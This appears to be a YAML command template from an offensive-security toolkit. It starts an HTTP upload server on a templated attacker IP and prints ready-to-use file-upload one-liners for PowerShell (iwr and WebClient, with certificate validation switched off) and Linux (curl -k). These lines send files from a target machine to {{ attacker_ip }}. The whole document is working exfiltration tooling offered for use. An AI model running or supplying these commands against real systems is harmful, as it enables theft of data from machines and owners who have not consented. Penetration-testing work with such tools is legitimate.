---
metadata:
  filename: "deliver-universal-transfer-inbound.yaml"
  tags: ["web"]
  created: "2025-03-29"
  authors: ["Unknown"]

content: |
  mkdir -p packstation/inbound; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                      -----PowerShell-----                      '; \
  printf '%s\n' 'Upload (PS 6+): iwr -Uri {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_inbound_port }}/upload?filename=FILE -Method Post -InFile FILE -ContentType application/octet-stream -SkipCertificateCheck'; \
  printf '%s\n' 'Upload (PS 5, iwr): [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; iwr -Uri {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_inbound_port }}/upload?filename=FILE -Method Post -InFile FILE -ContentType application/octet-stream'; \
  printf '%s\n' 'Upload (PS 5, WebClient): [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; (New-Object System.Net.WebClient).UploadFile('"'"'{{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_inbound_port }}/upload'"'"', '"'"'FILE'"'"')'; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                         -----CMD-----                          '; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                         ----Linux----                          '; \
  printf '%s\n' 'Upload data: curl -v -k {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_inbound_port }}/upload -F "file=@FILE"'; \
  printf '%s\n' '================================================================'; \
  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_inbound_port }} -d packstation/inbound {{ delivery_tls_flag }} --san {{ attacker_ip }}
